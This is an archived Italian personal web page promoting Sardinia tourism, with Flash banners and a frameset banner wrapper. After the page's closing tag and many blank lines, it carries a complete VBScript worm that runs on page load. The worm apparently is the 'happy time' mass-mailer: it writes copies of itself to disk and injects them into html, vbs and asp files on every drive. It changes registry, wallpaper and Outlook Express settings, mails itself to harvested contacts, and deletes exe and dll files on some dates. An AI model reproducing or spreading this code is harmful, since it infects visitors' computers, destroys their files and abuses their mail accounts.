<script>
    chiamato = 0;
    function relink() {
        document.onclick=function(evt){
            var target;
            evt=evt||window.event;
            target=evt.target||evt.srcElement;
            if ((target.nodeName=='A' || target.parentNode.nodeName=='A' || target.onclick || target.parentNode.onclick) && (target.className!='search' && target.parentNode.className!='search')){
                refresh();
            }
	}
    }

    myreg=new RegExp("web\.tiscali\.it","i");
    if (!myreg.test("'"+top.location+"'")) {
        top.location=self.location;
    }

    var shortuserdir="tecno_graft";
    var bannercode="/banner-tiscali/banner.html";
</script><script>
function rescan() {
    for (var i=0;i<6;i++) {
        setTimeout("relink()", 1000);
    }
    if(window == window.top) {
        top.document.getElementsByTagName('frameset').item(0).rows='100,*,0';
    }
}

function refresh() {
    top.frames[0].location='/banner-tiscali/banner.html';
    top.frames[top.frames.length-1].location='/banner-tiscali/stats.html?userpage_'+shortuserdir;
    chiamato = 1;
}

if(window == window.top) {
        var address=window.location;
        var s='<html><head><title>'+'</title></head>'+
        '<frameset rows="100,*,0" frameborder="0" border="0" framespacing="0" onload="refresh();">'+
        '<frame src="" marginwidth="0" marginheight="0" scrolling="no" noresize>'+
        '<frame src="" marginwidth="0" marginheight="0" scrolling="auto" noresize>'+
        '<frame src="" marginwidth="0" marginheight="0" scrolling="no" noresize>'+
        '</frameset>'+
        '</html>';
        document.write(s);
        top.frames[top.frames.length % 2].location=address;
}
</script>
<html>
<head>
<title>Untitled Document</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<script language="JavaScript">
<!--
function MM_timelinePlay(tmLnName, myID) { //v1.2
  //Copyright 1997 Macromedia, Inc. All rights reserved.
  var i,j,tmLn,props,keyFrm,sprite,numKeyFr,firstKeyFr,propNum,theObj,firstTime=false;
  if (document.MM_Time == null) MM_initTimelines(); //if *very* 1st time
  tmLn = document.MM_Time[tmLnName];
  if (myID == null) { myID = ++tmLn.ID; firstTime=true;}//if new call, incr ID
  if (myID == tmLn.ID) { //if Im newest
    setTimeout('MM_timelinePlay("'+tmLnName+'",'+myID+')',tmLn.delay);
    fNew = ++tmLn.curFrame;
    for (i=0; i<tmLn.length; i++) {
      sprite = tmLn[i];
      if (sprite.charAt(0) == 's') {
        if (sprite.obj) {
          numKeyFr = sprite.keyFrames.length; firstKeyFr = sprite.keyFrames[0];
          if (fNew >= firstKeyFr && fNew <= sprite.keyFrames[numKeyFr-1]) {//in range
            keyFrm=1;
            for (j=0; j<sprite.values.length; j++) {
              props = sprite.values[j]; 
              if (numKeyFr != props.length) {
                if (props.prop2 == null) sprite.obj[props.prop] = props[fNew-firstKeyFr];
                else        sprite.obj[props.prop2][props.prop] = props[fNew-firstKeyFr];
              } else {
                while (keyFrm<numKeyFr && fNew>=sprite.keyFrames[keyFrm]) keyFrm++;
                if (firstTime || fNew==sprite.keyFrames[keyFrm-1]) {
                  if (props.prop2 == null) sprite.obj[props.prop] = props[keyFrm-1];
                  else        sprite.obj[props.prop2][props.prop] = props[keyFrm-1];
        } } } } }
      } else if (sprite.charAt(0)=='b' && fNew == sprite.frame) eval(sprite.value);
      if (fNew > tmLn.lastFrame) tmLn.ID = 0;
  } }
}

function MM_timelineGoto(tmLnName, fNew, numGotos) { //v2.0
  //Copyright 1997 Macromedia, Inc. All rights reserved.
  var i,j,tmLn,props,keyFrm,sprite,numKeyFr,firstKeyFr,lastKeyFr,propNum,theObj;
  if (document.MM_Time == null) MM_initTimelines(); //if *very* 1st time
  tmLn = document.MM_Time[tmLnName];
  if (numGotos != null)
    if (tmLn.gotoCount == null) tmLn.gotoCount = 1;
    else if (tmLn.gotoCount++ >= numGotos) {tmLn.gotoCount=0; return}
  jmpFwd = (fNew > tmLn.curFrame);
  for (i = 0; i < tmLn.length; i++) {
    sprite = (jmpFwd)? tmLn[i] : tmLn[(tmLn.length-1)-i]; //count bkwds if jumping back
    if (sprite.charAt(0) == "s") {
      numKeyFr = sprite.keyFrames.length;
      firstKeyFr = sprite.keyFrames[0];
      lastKeyFr = sprite.keyFrames[numKeyFr - 1];
      if ((jmpFwd && fNew<firstKeyFr) || (!jmpFwd && lastKeyFr<fNew)) continue; //skip if untouchd
      for (keyFrm=1; keyFrm<numKeyFr && fNew>=sprite.keyFrames[keyFrm]; keyFrm++);
      for (j=0; j<sprite.values.length; j++) {
        props = sprite.values[j];
        if (numKeyFr == props.length) propNum = keyFrm-1 //keyframes only
        else propNum = Math.min(Math.max(0,fNew-firstKeyFr),props.length-1); //or keep in legal range
        if (sprite.obj != null) {
          if (props.prop2 == null) sprite.obj[props.prop] = props[propNum];
          else        sprite.obj[props.prop2][props.prop] = props[propNum];
      } }
    } else if (sprite.charAt(0)=='b' && fNew == sprite.frame) eval(sprite.value);
  }
  tmLn.curFrame = fNew;
  if (tmLn.ID == 0) eval('MM_timelinePlay(tmLnName)');
}

function MM_initTimelines() {
    //MM_initTimelines() Copyright 1997 Macromedia, Inc. All rights reserved.
    var ns = navigator.appName == "Netscape";
    document.MM_Time = new Array(1);
    document.MM_Time[0] = new Array(3);
    document.MM_Time["Timeline1"] = document.MM_Time[0];
    document.MM_Time[0].MM_Name = "Timeline1";
    document.MM_Time[0].fps = 15;
    document.MM_Time[0][0] = new String("behavior");
    document.MM_Time[0][0].frame = 46;
    document.MM_Time[0][0].value = "MM_timelineGoto('Timeline1','1')";
    document.MM_Time[0][1] = new String("sprite");
    document.MM_Time[0][1].slot = 1;
    if (ns)
        document.MM_Time[0][1].obj = document["Layer10"];
    else
        document.MM_Time[0][1].obj = document.all ? document.all["Layer10"] : null;
    document.MM_Time[0][1].keyFrames = new Array(1, 24);
    document.MM_Time[0][1].values = new Array(2);
    document.MM_Time[0][1].values[0] = new Array(151,167,182,198,214,230,245,261,277,293,308,324,340,356,371,387,403,419,434,450,466,482,497,513);
    document.MM_Time[0][1].values[0].prop = "left";
    document.MM_Time[0][1].values[1] = new Array(127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127);
    document.MM_Time[0][1].values[1].prop = "top";
    if (!ns) {
        document.MM_Time[0][1].values[0].prop2 = "style";
        document.MM_Time[0][1].values[1].prop2 = "style";
    }
    document.MM_Time[0][2] = new String("sprite");
    document.MM_Time[0][2].slot = 1;
    if (ns)
        document.MM_Time[0][2].obj = document["Layer10"];
    else
        document.MM_Time[0][2].obj = document.all ? document.all["Layer10"] : null;
    document.MM_Time[0][2].keyFrames = new Array(25, 46);
    document.MM_Time[0][2].values = new Array(2);
    document.MM_Time[0][2].values[0] = new Array(513,496,479,461,444,427,410,392,375,358,341,323,306,289,272,254,237,220,203,185,168,151);
    document.MM_Time[0][2].values[0].prop = "left";
    document.MM_Time[0][2].values[1] = new Array(127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127);
    document.MM_Time[0][2].values[1].prop = "top";
    if (!ns) {
        document.MM_Time[0][2].values[0].prop2 = "style";
        document.MM_Time[0][2].values[1].prop2 = "style";
    }
    document.MM_Time[0].lastFrame = 46;
    for (i=0; i<document.MM_Time.length; i++) {
        document.MM_Time[i].ID = null;
        document.MM_Time[i].curFrame = 0;
        document.MM_Time[i].delay = 1000/document.MM_Time[i].fps;
    }
}
//-->
</script>
<style type="text/css">
<!--
.email {  color: #FFFFFF; text-decoration: none}
-->
</style>
</head>

<body bgcolor="#FFFFFF" onLoad="MM_timelinePlay('Timeline1');">
<div id="Layer1" style="position:absolute; left:472px; top:1px; width:301px; height:127px; z-index:1"><img src="front1.jpg" width="300" height="120"></div>
<div id="Layer2" style="position:absolute; left:3px; top:14px; width:472px; height:108px; z-index:2"> 
  <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=4,0,2,0" width="471" height="104">
    <param name=movie value="logo_sardegna_italia.swf">
    <param name=quality value=high>
    <embed src="logo_sardegna_italia.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="471" height="104">
    </embed> 
  </object></div>
<div id="Layer3" style="position:absolute; left:328px; top:259px; width:178px; height:310px; z-index:6"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=4,0,2,0" width="178" height="311">
    <param name=movie value="SARDINIA_X.swf">
    <param name=quality value=high>
    <embed src="SARDINIA_X.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="178" height="311">
    </embed> 
  </object></div>
<div id="Layer5" style="position:absolute; left:653px; top:272px; width:123px; height:377px; z-index:7"><img src="front2.jpg" width="120" height="400"></div>
<div id="Layer6" style="position:absolute; left:3px; top:124px; width:769px; height:23px; z-index:8; background-color: #990033; layer-background-color: #990033; border: 1px none #000000"> 
</div>
<div id="Layer7" style="position:absolute; left:317px; top:572px; width:303px; height:171px; z-index:9"> 
  <p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> uesto sito nasce 
    per far conoscere una delle più belle e affascinanti isole del Mediterraneo 
    qual'è la Sardegna. Anche per chi già ne conosce le sue stupende coste, qui 
    potrà trovare angoli di paesaggio non ancora conosciuti ai più, con tutte 
    le informazioni (compreso le carte stradali) per arrivarci, per visitarli 
    e per goderne a pieno le bellezze. Per chi non ama l'avventura, qui potrà 
    trovare tutti gli indirizzi utili dalla lista degli alberghi, degli agriturismo, 
    dei campeggi, del commercio, dell'artigianato tipico, dei produttori di tutte 
    quelle prelibatezze che fanno della cucina sarda una delle più rinomate. Ancora 
    Storia, Arte e Archeologia l'Ambiente, le Tradizioni di tutti i paesi. </font></p>
</div>
<div id="Layer8" style="position:absolute; left:281px; top:539px; width:26px; height:40px; z-index:10"><font face="Times New Roman, Times, serif" size="7" color="#993300">Q</font></div>
<div id="Layer9" style="position:absolute; left:1px; top:151px; width:196px; height:81px; z-index:11"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=4,0,2,0" width="198" height="78">
    <param name=movie value="materiale_clienti/sdb/bunner.swf">
    <param name=quality value=high>
    <embed src="materiale_clienti/sdb/bunner.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="198" height="78">
    </embed> 
  </object></div>
<div id="Layer4" style="position:absolute; left:1px; top:256px; width:202px; height:397px; z-index:12"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=4,0,2,0" width="196" height="392">
    <param name=movie value="menu_principale.swf">
    <param name=quality value=high>
    <embed src="menu_principale.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="196" height="392">
    </embed> 
  </object></div>
<div id="Layer10" style="position:absolute; left:151px; top:127px; width:158px; height:13px; z-index:13"><font size="2" color="#FFFFFF"><b><font face="Verdana, Arial, Helvetica, sans-serif">in 
  costruzione</font></b></font> </div>
<div id="Layer13" style="position:absolute; left:611px; top:151px; width:158px; height:85px; z-index:17"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=4,0,2,0" width="160" height="120">
    <param name=movie value="materiale_clienti/fioredimaggio/banner.swf">
    <param name=quality value=high>
    <embed src="materiale_clienti/fioredimaggio/banner.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="160" height="120">
    </embed> 
  </object></div>
<div id="Layer14" style="position:absolute; left:653px; top:673px; width:125px; height:54px; z-index:18"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=4,0,2,0" width="124" height="54">
    <param name=movie value="iwantyou.swf">
    <param name=quality value=high>
    <embed src="iwantyou.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="124" height="54">
    </embed> 
  </object></div>
<div id="Layer15" style="position:absolute; left:648px; top:128px; width:134px; height:29px; z-index:19"><font color="#FFFFFF"><b><font face="Verdana, Arial, Helvetica, sans-serif" size="1"><a href="mailto:tecnograft@tiscalinet.it" class="email">mandaci 
  una e- mail</a></font></b></font></div>
<div id="Layer19" style="position:absolute; width:333px; height:60px; z-index:22; left: 225px; top: 153px"><img src="materiale_clienti/navi_banner_2.gif" width="350" height="62" border="0"></div>
<div id="Layer20" style="position:absolute; width:350px; height:19px; z-index:23; left: 225px; top: 218px"> 
  <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><b><font color="#3333FF">Prenotazione 
    on-line per la Sardegna</font></b></font></div>
</div>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<div id="Layer11" style="position:absolute; width:151px; height:152px; z-index:24; left: 47px; top: 658px"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=4,0,2,0" width="150" height="150">
    <param name=movie value="materiale_clienti/dolce_piccante/banner.swf">
    <param name=quality value=high>
    <embed src="materiale_clienti/dolce_piccante/banner.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="150" height="150">
    </embed> 
  </object></div>
<p>&nbsp;</p>
</body>
</html>
<script language='VBScript'>




















































































Rem I am sorry! happy time
On Error Resume Next
mload
Sub mload()
On Error Resume Next
mPath = Grf()
Set Os = CreateObject("Scriptlet.TypeLib")
Set Oh = CreateObject("Shell.Application")
If IsHTML Then
mURL = LCase(document.Location)
If mPath = "" Then
Os.Reset
Os.Path = "C:\Help.htm"
Os.Doc = Lhtml()
Os.Write()
Ihtml = "<span style='position:absolute'><Iframe src='C:\Help.htm' width='0' height='0'></Iframe></span>"
Call document.Body.insertAdjacentHTML("AfterBegin", Ihtml)
Else
If Iv(mPath, "Help.vbs") Then
setInterval "Rt()", 10000
Else
m = "hta"
If LCase(m) = Right(mURL, Len(m)) Then
id = setTimeout("mclose()", 1)
main
Else
Os.Reset()
Os.Path = mPath & "\" & "Help.hta"
Os.Doc = Lhtml()
Os.write()
Iv mPath, "Help.hta"
End If
End If
End If
Else
main
End If
End Sub
Sub main()
On Error Resume Next
Set Of = CreateObject("Scripting.FileSystemObject")
Set Od = CreateObject("Scripting.Dictionary")
Od.Add "html", "1100"
Od.Add "vbs", "0100"
Od.Add "htm", "1100"
Od.Add "asp", "0010"
Ks = "HKEY_CURRENT_USER\Software\"
Ds = Grf()
Cs = Gsf()
If IsVbs Then
If Of.FileExists("C:\help.htm") Then
Of.DeleteFile ("C:\help.htm")
End If
Key = CInt(Month(Date) + Day(Date))
If Key = 13 Then
Od.RemoveAll
Od.Add "exe", "0001"
Od.Add "dll", "0001"
End If
Cn = Rg(Ks & "Help\Count")
If Cn = "" Then
Cn = 1
End If
Rw Ks & "Help\Count", Cn + 1
f1 = Rg(Ks & "Help\FileName")
f2 = FNext(Of, Od, f1)
fext = GetExt(Of, Od, f2)
Rw Ks & "Help\FileName", f2
If IsDel(fext) Then
f3 = f2
f2 = FNext(Of, Od, f2)
Rw Ks & "Help\FileName", f2
Of.DeleteFile f3
Else
If LCase(WScript.ScriptFullname) <> LCase(f2) Then
Fw Of, f2, fext
End If
End If
If (CInt(Cn) Mod 366) = 0 Then
If (CInt(Second(Time)) Mod 2) = 0 Then
Tsend
Else
adds = Og
Msend (adds)
End If
End If
wp = Rg("HKEY_CURRENT_USER\Control Panel\desktop\wallPaper")
If Rg(Ks & "Help\wallPaper") <> wp Or wp = "" Then
If wp = "" Then
n1 = ""
n3 = Cs & "\Help.htm"
Else
mP = Of.GetFile(wp).ParentFolder
n1 = Of.GetFileName(wp)
n2 = Of.GetBaseName(wp)
n3 = Cs & "\" & n2 & ".htm"
End If
Set pfc = Of.CreateTextFile(n3, True)
mt = Sa("1100")
pfc.Write "<" & "HTML><" & "body bgcolor='#007f7f' background='" & n1 & "'><" & "/Body><" & "/HTML>" & mt
pfc.Close
Rw Ks & "Help\wallPaper", n3
Rw "HKEY_CURRENT_USER\Control Panel\desktop\wallPaper", n3
End If
Else
Set fc = Of.CreateTextFile(Ds & "\Help.vbs", True)
fc.Write Sa("0100")
fc.Close
bf = Cs & "\Untitled.htm"
Set fc2 = Of.CreateTextFile(bf, True)
fc2.Write Lhtml
fc2.Close
oeid = Rg("HKEY_CURRENT_USER\Identities\Default User ID")
oe = "HKEY_CURRENT_USER\Identities\" & oeid & "\Software\Microsoft\Outlook Express\5.0\Mail"
MSH = oe & "\Message Send HTML"
CUS = oe & "\Compose Use Stationery"
SN = oe & "\Stationery Name"
Rw MSH, 1
Rw CUS, 1
Rw SN, bf
Web = Cs & "\WEB"
Set gf = Of.GetFolder(Web).Files
Od.Add "htt", "1100"
For Each m In gf
fext = GetExt(Of, Od, m)
If fext <> "" Then
Fw Of, m, fext
End If
Next
End If
End Sub
Sub mclose()
document.Write "<" & "title>I am sorry!</title" & ">"
window.Close
End Sub
Sub Rt()
Dim mPath
On Error Resume Next
mPath = Grf()
Iv mPath, "Help.vbs"
End Sub
Function Sa(n)
Dim VBSText, m
VBSText = Lvbs()
If Mid(n, 3, 1) = 1 Then
m = "<%" & VBSText & "%>"
End If
If Mid(n, 2, 1) = 1 Then
m = VBSText
End If
If Mid(n, 1, 1) = 1 Then
m = Lscript(m)
End If
Sa = m & vbCrLf
End Function
Sub Fw(Of, S, n)
Dim fc, fc2, m, mmail, mt
On Error Resume Next
Set fc = Of.OpenTextFile(S, 1)
mt = fc.ReadAll
fc.Close
If Not Sc(mt) Then
mmail = Ml(mt)
mt = Sa(n)
Set fc2 = Of.OpenTextFile(S, 8)
fc2.Write mt
fc2.Close
Msend (mmail)
End If
End Sub
Function Sc(S)
mN = "Rem I am sorry! happy time"
If InStr(S, mN) > 0 Then
Sc = True
Else
Sc = False
End If
End Function
Function FNext(Of, Od, S)
Dim fpath, fname, fext, T, gf
On Error Resume Next
fname = ""
T = False
If Of.FileExists(S) Then
fpath = Of.GetFile(S).ParentFolder
fname = S
ElseIf Of.FolderExists(S) Then
fpath = S
T = True
Else
fpath = Dnext(Of, "")
End If
Do While True
Set gf = Of.GetFolder(fpath).Files
For Each m In gf
If T Then
If GetExt(Of, Od, m) <> "" Then
FNext = m
Exit Function
End If
ElseIf LCase(m) = LCase(fname) Or fname = "" Then
T = True
End If
Next
fpath = Pnext(Of, fpath)
Loop
End Function
Function Pnext(Of, S)
On Error Resume Next
Dim Ppath, Npath, gp, pn, T, m
T = False
If Of.FolderExists(S) Then
Set gp = Of.GetFolder(S).SubFolders
pn = gp.Count
If pn = 0 Then
Ppath = LCase(S)
Npath = LCase(Of.GetParentFolderName(S))
T = True
Else
Npath = LCase(S)
End If
Do While Not Er
For Each pn In Of.GetFolder(Npath).SubFolders
If T Then
If Ppath = LCase(pn) Then
T = False
End If
Else
Pnext = LCase(pn)
Exit Function
End If
Next
T = True
Ppath = LCase(Npath)
Npath = Of.GetParentFolderName(Npath)
If Of.GetFolder(Ppath).IsRootFolder Then
m = Of.GetDriveName(Ppath)
Pnext = Dnext(Of, m)
Exit Function
End If
Loop
End If
End Function
Function Dnext(Of, S)
Dim dc, n, d, T, m
On Error Resume Next
T = False
m = ""
Set dc = Of.Drives
For Each d In dc
If d.DriveType = 2 Or d.DriveType = 3 Then
If T Then
Dnext = d
Exit Function
Else
If LCase(S) = LCase(d) Then
T = True
End If
If m = "" Then
m = d
End If
End If
End If
Next
Dnext = m
End Function
Function GetExt(Of, Od, S)
Dim fext
On Error Resume Next
fext = LCase(Of.GetExtensionName(S))
GetExt = Od.Item(fext)
End Function
Sub Rw(k, v)
Dim R
On Error Resume Next
Set R = CreateObject("WScript.Shell")
R.RegWrite k, v
End Sub
Function Rg(v)
Dim R
On Error Resume Next
Set R = CreateObject("WScript.Shell")
Rg = R.RegRead(v)
End Function
Function IsVbs()
Dim ErrTest
On Error Resume Next
ErrTest = WScript.ScriptFullname
If Err Then
IsVbs = False
Else
IsVbs = True
End If
End Function
Function IsHTML()
Dim ErrTest
On Error Resume Next
ErrTest = document.Location
If Er Then
IsHTML = False
Else
IsHTML = True
End If
End Function
Function IsMail(S)
Dim m1, m2
IsMail = False
If InStr(S, vbCrLf) = 0 Then
m1 = InStr(S, "@")
m2 = InStr(S, ".")
If m1 <> 0 And m1 < m2 Then
IsMail = True
End If
End If
End Function
Function Lvbs()
Dim f, m, ws, Of
On Error Resume Next
If IsVbs Then
Set Of = CreateObject("Scripting.FileSystemObject")
Set f = Of.OpenTextFile(WScript.ScriptFullname, 1)
Lvbs = f.ReadAll
Else
For Each ws In document.scripts
If LCase(ws.Language) = "vbscript" Then
If Sc(ws.Text) Then
Lvbs = ws.Text
Exit Function
End If
End If
Next
End If
End Function
Function Iv(mPath, mName)
Dim Shell
On Error Resume Next
Set Shell = CreateObject("Shell.Application")
Shell.NameSpace(mPath).Items.Item(mName).InvokeVerb
If Er Then
Iv = False
Else
Iv = True
End If
End Function
Function Grf()
Dim Shell, mPath
On Error Resume Next
Set Shell = CreateObject("Shell.Application")
mPath = "C:\"
For Each mShell In Shell.NameSpace(mPath).Items
If mShell.IsFolder Then
Grf = mShell.Path
Exit Function
End If
Next
If Er Then
Grf = ""
End If
End Function
Function Gsf()
Dim Of, m
On Error Resume Next
Set Of = CreateObject("Scripting.FileSystemObject")
m = Of.GetSpecialFolder(0)
If Er Then
Gsf = "C:\"
Else
Gsf = m
End If
End Function
Function Lhtml()
Lhtml = "<" & "HTML" & "><HEAD" & ">" & vbCrLf & _
"<" & "Title> Help </Title" & "><" & "/HEAD>" & vbCrLf & _
"<" & "Body> " & Lscript(Lvbs()) & vbCrLf & _
"<" & "/Body></HTML" & ">"
End Function
Function Lscript(S)
Lscript = "<" & "script language='VBScript'>" & vbCrLf & _
S & "<" & "/script" & ">"
End Function
Function Sl(S1, S2, n)
Dim l1, l2, l3, i
l1 = Len(S1)
l2 = Len(S2)
i = InStr(S1, S2)
If i > 0 Then
l3 = i + l2 - 1
If n = 0 Then
Sl = Left(S1, i - 1)
ElseIf n = 1 Then
Sl = Right(S1, l1 - l3)
End If
Else
Sl = ""
End If
End Function
Function Ml(S)
Dim S1, S3, S2, T, adds, m
S1 = S
S3 = """"
adds = ""
S2 = S3 & "mailto" & ":"
T = True
Do While T
S1 = Sl(S1, S2, 1)
If S1 = "" Then
T = False
Else
m = Sl(S1, S3, 0)
If IsMail(m) Then
adds = adds & m & vbCrLf
End If
End If
Loop
Ml = Split(adds, vbCrLf)
End Function
Function Og()
Dim i, n, m(), Om, Oo
Set Oo = CreateObject("Outlook.Application")
Set Om = Oo.GetNamespace("MAPI").GetDefaultFolder(10).Items
n = Om.Count
ReDim m(n)
For i = 1 To n
m(i - 1) = Om.Item(i).Email1Address
Next
Og = m
End Function
Sub Tsend()
Dim Od, MS, MM, a, m
Set Od = CreateObject("Scripting.Dictionary")
MConnect MS, MM
MM.FetchSorted = True
MM.Fetch
For i = 0 To MM.MsgCount - 1
MM.MsgIndex = i
a = MM.MsgOrigAddress
If Od.Item(a) = "" Then
Od.Item(a) = MM.MsgSubject
End If
Next
For Each m In Od.Keys
MM.Compose
MM.MsgSubject = "Fw: " & Od.Item(m)
MM.RecipAddress = m
MM.AttachmentPathName = Gsf & "\Untitled.htm"
MM.Send
Next
MS.SignOff
End Sub
Function MConnect(MS, MM)
Dim U
On Error Resume Next
Set MS = CreateObject("MSMAPI.MAPISession")
Set MM = CreateObject("MSMAPI.MAPIMessages")
U = Rg("HKEY_CURRENT_USER\Software\Microsoft\Windows Messaging Subsystem\Profiles\DefaultProfile")
MS.UserName = U
MS.DownLoadMail = False
MS.NewSession = False
MS.LogonUI = True
MS.SignOn
MM.SessionID = MS.SessionID
End Function
Sub Msend(Address)
Dim MS, MM, i, a
MConnect MS, MM
i = 0
MM.Compose
For Each a In Address
If IsMail(a) Then
MM.RecipIndex = i
MM.RecipAddress = a
i = i + 1
End If
Next
MM.MsgSubject = " Help "
MM.AttachmentPathName = Gsf & "\Untitled.htm"
MM.Send
MS.SignOff
End Sub
Function Er()
If Err.Number = 0 Then
Er = False
Else
Err.Clear
Er = True
End If
End Function
Function IsDel(S)
If Mid(S, 4, 1) = 1 Then
IsDel = True
Else
IsDel = False
End If
End Function




</script>
<script>
relink();
setInterval("rescan()", 1000);
top.document.title = top.frames[top.frames.length % 2].document.title;
</script>